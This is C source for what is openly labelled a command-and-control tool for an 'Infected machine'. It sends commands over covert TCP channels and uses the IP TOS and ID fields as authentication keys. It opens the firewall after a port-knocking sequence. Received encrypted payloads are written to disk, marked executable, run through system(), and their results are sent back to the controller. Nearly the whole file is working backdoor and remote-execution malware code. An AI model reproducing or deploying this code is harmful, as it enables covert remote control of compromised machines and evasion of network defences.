#include "main.h"

static void print_usage(void) {
    puts("Usage options: \n"
            "\t[--cnc]\t\tIP address of Command and Control\n"
            "\t[--in]\t\tIP address of Infected machine\n"
            "\t[--cport]\tPort on Command and Control\n"
            "\t[--iport]\tPort on Infected machine\n"
            "\t[--cmd]\t\tCommand to send to the Infected machine\n"
            "\nExample:\n"
            "\t./cnc --cnc 192.168.0.100 --in 192.168.0.101 --cport 8505 --dport 8505 --cmd \"echo hi\"\n");
}

static struct option long_options[] = {
    {"cnc",     required_argument,  0,  0},
    {"in",      required_argument,  0,  1},
    {"cport",   required_argument,  0,  2},
    {"iport",   required_argument,  0,  3},
    {"cmd",     required_argument,  0,  4},
    {0,         0,                  0,  0}
};

int main(int argc, char **argv){
    int arg;
    unsigned short cnc_port = 0, infected_port = 0;
    char cnc_ip[BUFFERSIZE] = "", infected_ip[BUFFERSIZE] = "";
    unsigned char cmd[BUFFERSIZE] = "";

    //char *c = "c";
    //char *sip = CNCIP;
    //char *dip = INFECTEDIP;
    //unsigned short sport = SHPORT;
    //unsigned short dport = SHPORT;
    //unsigned char data[BUFSIZE] = "echo hi";
    pattern[0] = 14881; //port 8506 in u_short
    pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
    knocking[0] = 0; // initilizing the knocking
    knocking[1] = 0;

    //user arguments
    while(1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch(arg) {
            case 0:
                strncpy(cnc_ip, optarg, strlen(optarg));
                printf("CNC IP: %s\n", cnc_ip);
                break;
            case 1:
                strncpy(infected_ip, optarg, strlen(optarg));
                printf("Infected IP: %s\n", infected_ip);
                break;
            case 2:
                cnc_port = atoi(optarg);
                printf("CNC Port: %hu\n", cnc_port);
                break;
            case 3:
                infected_port = atoi(optarg);
                printf("Infected Port: %hu\n", infected_port);
                break;
            case 4:
                strncpy((char*)cmd, optarg, strlen(optarg));
                printf("CMD: %s\n", cmd);
                break;
            default:
                print_usage();
                exit(1);
        }

    }

    if(strcmp(cnc_ip, "") == 0 ||
                strcmp(infected_ip, "") == 0 ||
                cnc_port == 0 ||
                infected_port ==0 ||
                strcmp((const char*) cmd, "") == 0) {
        print_usage();
        exit(1);
    }

    //covert_send(sip, dip, sport, dport, data, 0);
    covert_send(cnc_ip, infected_ip, cnc_port, infected_port, cmd, 0);
    Packetcapture();
    exit(1);
    return 0;
}

int Packetcapture(){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }

    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet);
        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
            ParsePattern(args,pkthdr, packet);
        } else {
            printf("Packet tossed wrong key\n");
        }
    }

}

bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
    if(knock){
        //check if the key is right for port knocking
        if(ip_tos == 'b' && ip_id == 'l'){
            return true;
        } else {
            return false;
        }
    } else {
        // check if key is right for normal packets
        if(ip_tos == 'l' && ip_id == 'b'){
            return true;
        } else {
            return false;
        }
    }
}

void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
    for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
        if(pattern[k] == tcp->th_dport){
            knocking[k] = 1;
        }
    }
    if((knocking[0] == 1) && (knocking[1] == 1)){
        system(IPTABLES(INFECTEDIP));
        char *dip = INFECTEDIP;
        unsigned short sport = SHPORT;
        unsigned short dport = SHPORT;
        printf("WAITING FOR DATA\n");
        recv_results(dip, dport, RESULT_FILE);
        system(TURNOFF(INFECTEDIP));
        pcap_breakloop(interfaceinfo);
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(payload, size_payload);
    }
}

void ParsePayload(const u_char *payload, int len){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
    cipherlen = strlen((char*)payload);
//    printf("Encrypted Payload is: %s \n", payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    printf("Decrypted payload size: %d\n", decryptedlen);
    printf("Decrypted Payload is: %s \n", decryptedtext);
    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    fclose(fp);
    system(CHMOD);
    system(CMD);
    system(IPTABLES(INFECTEDIP));


    //sending the results back to the CNC
    char *srcip = INFECTEDIP;
    char *destip = CNCIP;
    unsigned short sport = SHPORT;
    unsigned short dport = SHPORT;

    send_results(srcip, destip, sport, dport, RESULT_FILE);
    system(TURNOFF(INFECTEDIP));
}

